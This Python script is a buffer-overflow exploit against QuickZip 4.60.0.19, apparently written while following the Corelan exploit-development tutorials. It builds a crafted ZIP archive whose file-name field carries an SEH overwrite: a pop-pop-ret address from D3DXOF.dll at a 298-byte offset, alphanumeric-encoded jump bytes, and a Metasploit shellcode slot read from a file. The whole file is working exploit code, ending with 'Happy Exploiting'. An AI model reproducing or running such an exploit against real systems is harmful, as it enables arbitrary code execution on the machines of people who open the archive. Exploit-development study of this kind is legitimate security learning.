#!/usr/bin/python

'''
QuickZip buffer overflow exploit from Corelan blog series 
exploiting using ppr 
Program Name: QuickZip 4.60.0.19
Offset :- 
Shellcode := 
Special Thanks to Corelan and OffsecTeam 
'''

def createZip(fileName,shellcode):
    fileHandler = open(fileName,'w')
    ldfHeader =  "\x50\x4B\x03\x04\x14\x00\x00"
    ldfHeader += "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    ldfHeader += "\x00\x00\x00\x00\x00\x00\x00\x00"
    ldfHeader += "\xe4\x0f"  #file size
    ldfHeader += "\x00\x00\x00"

    cdfHeader =  "\x50\x4B\x01\x02\x14\x00\x14"
    cdfHeader += "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    cdfHeader += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    cdfHeader += "\xe4\x0f"
    cdfHeader += "\x00\x00\x00\x00\x00\x00\x01\x00"
    cdfHeader += "\x24\x00\x00\x00\x00\x00\x00\x00"

    eofcdfHeader = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    eofcdfHeader += "\x12\x10\x00\x00" # Size of central directory (bytes)
    eofcdfHeader += "\x02\x10\x00\x00" # Offset of start of central directory, relative to start of archive
    eofcdfHeader += "\x00\x00"

    payload = shellcode #metasploit payload
    payload += ".txt"

    print "[+] Size of the payload is {0}".format(len(payload))
    print "[+] Creating file with Name {0}".format(fileName)

    fileHandler.write(ldfHeader+payload+cdfHeader+payload+eofcdfHeader)
    fileHandler.close()

    print "[+] File Creating Finish ! Happy Exploiting !"


def readShellcode():
    #use ecx as base register alpha_mixed 
    fileHandler = open("buffer.txt","r")
    shellcode = fileHandler.read()
    fileHandler.close()
    
    #buffer size is 4064
    # ppr from D3DXOF.dll 6D7E786B SafeSEH disable | 6D7E4873 | 736b2cf4  | 6d7e2d65
    # offset into seh handler 302
    buf =  ""
    buf += "\x25\x21\x21\x21\x21\x25\x40"
    buf += "\x40\x40\x40\x2d\x7e\x7e\x7e\x7e\x2d\x61\x61\x7e\x55"
    buf += "\x2d\x21\x21\x21\x21\x50\x2d\x7e\x3b\x7e\x7e\x2d\x7e"
    buf += "\x21\x42\x6b\x2d\x43\x21\x21\x21\x50\x2d\x7e\x7e\x2d"
    buf += "\x3c\x2d\x7e\x50\x21\x21\x2d\x35\x21\x21\x21\x50"
    payload = "B" * 298 + "\x58\x42\x42\x42" + "\x65\x2d\x7e\x6d" + "\x41\x41\x41\x41\x61\x50\x5c\x50\x59"+ buf + "\x75\xff\x75\xff"
    payload += "\x43" * 80
    payload += shellcode 
    payload += "\x43" * (4064-len(payload))
    # add ebx, 0x43a, jmp ebx
    #subShellcode = "\x2D\x25\x25\x25\x5F\x2D\x61\x61\x61\x62\x2D\x7A\x79\x7A\x5A\x50\x25\x55\x4E\x4D\x4A\x25\x2A\x31\x32\x35\x2d\x25\x5f\x25\x25\x2d\x25\x63\x25\x5f\x2d\x35\x7a\x7a\x77\x50"
    
    # 004C786F -- ppr from QuickZip code section 
    #shellcode =  "A" * 298 + "BBBB" + "CCCC"
    #shellcode += payload[:4064-len(shellcode)] + ".txt"
    #print payload[-1]
    #shellcode = payload 
    print "[+] Length of Shellcode {0}".format(len(shellcode))
    return payload

    
if __name__ == '__main__':
    fileName="quickzipexploit.zip"
    shellcode=readShellcode()
    createZip(fileName,shellcode)

